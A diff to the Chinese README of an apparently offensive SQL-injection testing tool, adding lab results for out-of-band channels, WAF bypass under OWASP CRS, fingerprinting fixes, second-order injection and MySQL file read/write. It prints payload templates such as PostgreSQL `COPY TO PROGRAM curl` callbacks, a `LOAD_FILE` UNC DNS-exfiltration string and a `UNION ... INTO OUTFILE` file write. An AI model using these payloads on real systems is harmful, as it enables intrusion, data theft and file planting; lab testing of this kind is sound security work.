@@ -47,9 +47,42 @@ docker compose up -d
 
 | 等级 | 方言 | 证据 |
 |---|---|---|
-| ✅ **真实引擎验证**（检测/绕过主链路跑通） | MySQL、MariaDB、PostgreSQL、SQLite | 真 MySQL 8.0.x（`e2e/real-mysql-lab` + `e2e/waf-real`）、真 MariaDB 11.4.13（`e2e/multi-engine-lab/mariadb-verify.mjs`）、PGlite 18.3、sql.js WASM |
+| ✅ **真实引擎验证**（检测/绕过主链路跑通） | MySQL、MariaDB、PostgreSQL、SQLite | 真 MySQL 8.0.x（`e2e/real-mysql-lab` + `e2e/waf-real`）、真 MariaDB 11.4.13（`e2e/multi-engine-lab/mariadb-verify.mjs`）、PGlite 18.3、sql.js WASM、真 PostgreSQL 16.2（`e2e/oob-real-lab` OOB 带外全链路） |
 | ⚠️ **部分通道验证** | H2、HSQLDB、Derby | `e2e/multi-engine-lab`（真实 JDBC 内存库，仅布尔通道 × CRS） |
 | ⛔ **模板适配（未在真实 DBMS 验证）** | SQL Server、Oracle、TiDB、DM8、ClickHouse、DB2、Sybase、Firebird、Informix、Access、MonetDB | 仅有检测/提取模板；方言语法、列类型、报错文本均可能有偏差 |
+
+**OOB 带外通道实测口径（2026-09-11 起）**：
+- **HTTP 回连**：真 PostgreSQL 16.2（超管）× 无回显 + WAF（拦 sleep/报错/union）场景下，
+  `COPY TO PROGRAM curl {CALLBACK}` 全链路回连命中（引擎 payload → 靶场 → PG 进程 → OS curl
+  真实回连 127.0.0.1:8899 → 接收端捕获 → 检出 `oob`）；对照组（默认四技术）在同一场景 0 检出，
+  OOB 为该场景唯一可达通道。
+- **DNS 带外**：真 MySQL 8.0.x（Windows，`--secure-file-priv=` 放行 LOAD_FILE）× 无回显场景下，
+  `LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))` 全链路命中（引擎 → 真 MySQL UNC 解析 →
+  Windows 系统解析器（NRPT 路由 `.ooblab.test`）→ DNS 接收端捕获 token → 检出 `oob`，evidence
+  标注「DNS 通道」）。接收端 DNS 侧自验证 5/5：自构 A 查询、真实 nslookup、错域过滤、`_` 前缀
+  过滤、非 A/AAAA 类型过滤。见 `e2e/oob-real-lab/`（dns-probe / manual-mysql-unc /
+  dns-engine-verify）与 `results/`。
+- **DNS 通道实战前提**：① MySQL 需 `secure_file_priv` 非 NULL（否则 LOAD_FILE 在约束检查即返回，
+  连 DNS 都不发起）；② 目标主机需能对外发起 DNS 查询且解析路径可达攻击者 NS；③ Windows 下
+  `.local` 被 mDNS 保留，测试域用 `.test` TLD。
+诚实边界：SQL Server xp_dirtree / Oracle UTL_HTTP 等其它库的 OOB 模板未真机验证；真实
+ModSecurity/商业云 WAF 环境未实测。
+
+**强动态页实测口径（2026-09-11 起）**：真 MySQL × `/noisy` 强动态靶点（动态内容占比 ~65%，
+时间戳/随机 hex/base36 矩阵 + 随机块序，`e2e/real-mysql-lab` lab-app.js）下布尔盲注稳定检出
+（3/3），`autoDynamicBlock` 动态块排除 + 基线噪声率自适应（adaptiveMinStable）有效。同靶点
+实测揪出并修复定库缺陷：剥 HTML 标签防不住正文随机文本拼出的裸库名子串（"h2"/"dm8"），
+报错定库在 H2/DM8 间摇摆；`dbmsFromError` 已加裸库名命中护栏（±160 字符窗口须有报错上下文
+关键词，强特征短语直接放行，真实报错页定库零回归——fingerprint/error/payloads 测试集 80/80）。
+
+**定库加固 + 二阶跨角色（2026-09-11 起）**：sqli-labs 全量复测揪出 L46 漏检——Python 靶场
+响应头 `Server: BaseHTTP/0.6` 含子串 "ase"，Sybase 头签名 `/ASE/i` 无词边界误命中 → 25ms 内
+抢先定库 Sybase → payload 族错配 → 0 检出。`FINGERPRINT` 响应头签名已全部加 `\b` 词边界
+（Sybase/ASE、H2、Derby/java、Access/asp 等裸短签名），修复后 L46 恢复检出，23/23（100%）。
+二阶注入新增跨角色触发（读写分离身份）：`secondOrder.storeCookies`（低权写入方）/ 
+`secondOrder.triggerCookies`（高权读出方）分别覆盖存储与触发页会话，显式 Cookie 优先、
+会话 cookieParams 合并补充，键值消毒（原型污染键过滤、上限 32 键）；未配置时行为零变化，
+二阶单测 20/20 + real-world-lab 端到端 9/9（second_order 检出）回归通过。
 
 **给客户的话**：若目标是 ⛔ 等级中的数据库（尤其 SQL Server / Oracle 这类主流库），
 请把结论视为**待复核线索**而非可用证据——报告会在 `summary.dbmsEvidence.caveat` 中自动声明这一点。
@@ -82,6 +115,7 @@ npm run waf-validate    # HTTP 实测验证 WAF 绕过
 npm run waf-e2e         # 运行 WAF e2e 对比测试
 npm run waf-real        # [对外口径] 真实 OWASP CRS v4.1.0 规则下 tamper 开/关 A/B
 npm run waf-auto        # CRS 下「引擎自动选链绕过」验收（不显式配 tamper）
+npm run acceptance      # 【门禁】全方位验收（10 套件，事实断言模式，可进 CI）
 ```
 
 ## 后端 API
@@ -168,12 +202,47 @@ error 通道仅在 orderby 场景命中。
 
 另：`off` 档须同时关掉 `adaptiveOnBlock`，否则不再是「无规避基线」（A/B 会串味）。
 
+### 验收门禁（`npm run acceptance`）
+
+10 套件一次跑完：服务端单测 → 独立刁钻靶场 → 检测回归 → 真 MySQL → 真 PG（含二阶）→
+**报告契约** → CRS 人工挂链 A/B → CRS 自动选链 → fileRead/fileWrite 真闭环。
+
+**判定纪律（关键）**：门禁**不采信任何套件自报的 PASS 字样**，只解析可独立核对的事实数字
+（漏洞场景数 / 安全误报数 / 技术位 / 文件是否真的存在），据此断言并决定退出码。
+
+制定这条纪律的原因：项目曾出现五类缺陷，全部位于**组件接缝**处，共同病征是
+「中间层自报成功、无人校验外部事实」——`wrote:true` 但文件不存在、探针发出但无闭合、
+靶场存在却因硬编码端口跑不起来。**覆盖率不等于有效性**。
+
+```bash
+npm run acceptance                  # 全量（约 8 分钟）
+npm run acceptance -- --skip-heavy  # 跳过最慢的 CRS 组
+npm run acceptance -- --only=waf-auto,waf-real   # 改完某模块做定向门禁
+```
+
+- 依赖缺失时输出 **SKIP + 原因**（不静默跳过、不假装通过）；任一必需套件失败 → 非零退出码。
+- 报告落盘 `e2e/results/acceptance-report.md`。
+- 门禁本身做过**缺陷注入验证**：临时移除有效 tamper 链后，`waf-auto` 套件精准 FAIL
+  （技术位 10 → 2），恢复后回到 PASS。
+
 ### 利用能力实测口径（2026-09-10 起）
 
 | 能力 | 状态 | 依据 |
 |---|---|---|
 | **fileRead（MySQL）** | ✅ **已跑通真实闭环** | HTTP 注入点 → UNION 注入 → `LOAD_FILE` → 内容回传，与自备标记文件**逐字节一致**。复现：`npm run e2e:file-read` |
-| fileWrite / UDF / os-shell / 注册表 | ⚠️ **实验特性，未真实验证** | 仍只有 mock 单测；能力矩阵按 DBMS 文档声明，未在任何真实库跑通 |
+| **fileWrite（MySQL）** | ✅ **已跑通真实闭环** | HTTP 注入点 → `INTO OUTFILE` → **文件系统侧确认落盘**（含注入标记）。复现：`npm run e2e:file-write` |
+| UDF / os-shell / 注册表 | ⚠️ **实验特性，未真实验证** | 仍只有 mock 单测；能力矩阵按 DBMS 文档声明，未在任何真实库跑通 |
+
+**fileWrite 两条投递通道（`via` 字段如实标注）**：
+
+| 通道 | 触发条件 | 特点 |
+|---|---|---|
+| `stacked` | 目标支持多语句（堆叠注入） | 写入内容即投递内容，最干净 |
+| `union` | 目标仅 UNION 注入（无堆叠） | `UNION SELECT '<content>',NULL... INTO OUTFILE`；**写入的是查询结果集**——文件首行可能含原查询数据（实测落盘内容含原表行 + 注入行） |
+
+> 旧实现只走堆叠通道：在仅 UNION 的目标上第二条语句不会执行，但 HTTP 响应仍为 200 →
+> 旧实现据此返回 `{wrote:true, verified:false}`，**文件从未落盘**（实测文件系统确认不存在）。
+> 现增加 UNION 回落 + `via` 标注，并在未落地时返回 `ok:false`（`wrote` 仅表示请求已发出）。
 
 **硬前提（必须如实告知客户）**：MySQL 的 `fileRead` 同时需要
 ① 账号具备 `FILE` 权限；② **`secure_file_priv` 放行**。
